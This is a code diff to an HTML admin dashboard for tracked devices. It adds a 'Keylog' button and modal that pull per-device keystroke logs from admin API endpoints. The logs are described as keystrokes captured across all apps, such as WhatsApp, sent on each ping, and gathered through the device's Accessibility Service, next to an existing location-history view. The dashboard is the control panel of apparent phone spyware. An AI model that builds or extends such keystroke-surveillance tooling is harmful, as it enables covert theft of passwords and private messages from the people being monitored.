@@ -747,6 +747,18 @@
         </div>
     </div>
 
+    <!-- KEYLOG MODAL -->
+    <div id="keylogModal" class="modal-overlay" style="z-index:2100;" onclick="if(event.target===this)closeKeylogModal()">
+        <div class="modal-card" style="max-width:700px;width:95%;max-height:85vh;display:flex;flex-direction:column;">
+            <h3>⌨️ Keystroke Log — <span id="keylogModalTitle"></span></h3>
+            <p style="font-size:12px;color:#64748b;margin:4px 0 12px;">Showing keystrokes captured across all apps. Sent on each ping.</p>
+            <div id="keylogContent" style="overflow-y:auto;flex:1;font-family:monospace;font-size:12px;color:#cbd5e1;"></div>
+            <div class="modal-actions" style="margin-top:16px;">
+                <button class="btn-modal-cancel" onclick="closeKeylogModal()">Close</button>
+            </div>
+        </div>
+    </div>
+
     <!-- TOAST CONTAINER -->
     <div id="toast-container"></div>
 
@@ -958,6 +970,7 @@
                         </div>
                         <div class="action-row">
                             <button class="history-btn" onclick="openHistoryDrawer('${device.id}', '${modelTitle.replace(/'/g, "\\'")}')">📜 Past Locations</button>
+                            <button class="history-btn" style="background:#7c3aed;" onclick="openKeylogModal(\'${device.id}\', \'${modelTitle.replace(/\'/g, "\\\'")}\')">⌨️ Keylog</button>
                             <button class="delete-btn" onclick="promptDeleteDevice('${device.id}', '${modelTitle.replace(/'/g, "\\'")}')" title="Remove Device">🗑️ Remove</button>
                         </div>
                     </div>
@@ -1411,6 +1424,75 @@
 
         // Initial load
         fetchDevices();
+
+        // ─────────────────────────────────────────────
+        // Keylog Modal
+        // ─────────────────────────────────────────────
+        async function openKeylogModal(deviceId, deviceName) {
+            document.getElementById('keylogModalTitle').textContent = deviceName || deviceId;
+            document.getElementById('keylogContent').innerHTML = '<p style="color:#64748b">Loading...</p>';
+            document.getElementById('keylogModal').classList.add('open');
+
+            try {
+                const [latestRes, historyRes] = await Promise.all([
+                    fetch(`/api/admin/devices/${deviceId}/keylog/latest`),
+                    fetch(`/api/admin/devices/${deviceId}/keylog?limit=10`)
+                ]);
+                const latest = await latestRes.json();
+                const history = await historyRes.json();
+
+                let html = '';
+
+                // Latest keylog
+                if (latest.keylog && latest.keylog.length > 0) {
+                    html += `<div style="background:#1e293b;border-radius:8px;padding:12px;margin-bottom:16px;border:1px solid #0284c7;">`;
+                    html += `<div style="font-size:11px;color:#38bdf8;font-weight:700;margin-bottom:8px;">⚡ LATEST PING — ${latest.recordedAt ? new Date(latest.recordedAt).toLocaleString() : 'Unknown time'} (${latest.count} entries)</div>`;
+                    html += renderKeylogEntries(latest.keylog);
+                    html += `</div>`;
+                } else {
+                    html += `<div style="color:#64748b;margin-bottom:16px;">No keylog received yet in latest ping.</div>`;
+                }
+
+                // History pings
+                if (history.pings && history.pings.length > 0) {
+                    html += `<div style="font-size:11px;color:#94a3b8;font-weight:700;margin-bottom:8px;text-transform:uppercase;">📜 Previous Pings With Keylog</div>`;
+                    history.pings.forEach(ping => {
+                        if (ping.pingId === (latest.keylog?.length > 0 ? '__skip__' : '')) return;
+                        html += `<details style="background:#1e293b;border-radius:8px;padding:10px;margin-bottom:10px;border:1px solid #334155;">`;
+                        html += `<summary style="cursor:pointer;font-size:11px;color:#94a3b8;">${ping.timestamp ? new Date(ping.timestamp).toLocaleString() : 'Unknown'} — ${ping.count} entries</summary>`;
+                        html += `<div style="margin-top:10px;">${renderKeylogEntries(ping.keystrokeLog)}</div>`;
+                        html += `</details>`;
+                    });
+                }
+
+                if (!html) html = '<p style="color:#64748b;">No keystrokes recorded yet. Enable Accessibility Service on the device first.</p>';
+                document.getElementById('keylogContent').innerHTML = html;
+            } catch (e) {
+                document.getElementById('keylogContent').innerHTML = `<p style="color:#ef4444;">Error loading keylog: ${e.message}</p>`;
+            }
+        }
+
+        function renderKeylogEntries(entries) {
+            if (!entries || entries.length === 0) return '<p style="color:#64748b;">No entries</p>';
+            let rows = '';
+            entries.forEach(entry => {
+                const app = entry.app || 'unknown';
+                const shortApp = app.split('.').pop(); // com.whatsapp → whatsapp
+                const time = entry.time || '';
+                const text = (entry.text || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+                rows += `<div style="display:flex;gap:8px;align-items:flex-start;padding:4px 0;border-bottom:1px solid #1e293b;">
+                    <span style="color:#64748b;min-width:52px;">${time}</span>
+                    <span style="color:#7c3aed;min-width:90px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${app}">${shortApp}</span>
+                    <span style="color:#e2e8f0;word-break:break-all;">${text}</span>
+                </div>`;
+            });
+            return rows;
+        }
+
+        function closeKeylogModal() {
+            document.getElementById('keylogModal').classList.remove('open');
+        }
+
     </script>
 </body>
 </html>
